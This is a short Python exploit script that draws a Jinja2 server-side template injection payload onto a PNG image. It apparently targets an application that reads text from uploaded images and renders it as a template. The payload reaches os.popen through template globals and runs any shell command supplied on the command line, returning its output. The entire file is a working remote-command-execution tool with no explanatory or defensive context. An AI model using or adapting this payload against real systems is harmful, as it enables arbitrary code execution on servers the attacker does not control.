#!/usr/bin/env python3

from PIL import Image, ImageDraw, ImageFont
import sys

def main():
 if len(sys.argv) < 2:
  print('Usage: {} <cmd>'.format(sys.argv[0]))
  exit()

 img = Image.new('RGB', (2000,100))
 draw = ImageDraw.Draw(img)
 myFont = ImageFont.truetype('LiberationMono-Regular.ttf', 15)

 payload = """{{{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen("{cmd}").read()}}}}""".format(cmd=sys.argv[1])
 draw.text((0,3), payload, fill=(255,255,255), font=myFont) # payload

 img.save('payload.png')

if __name__ == '__main__':
 main()
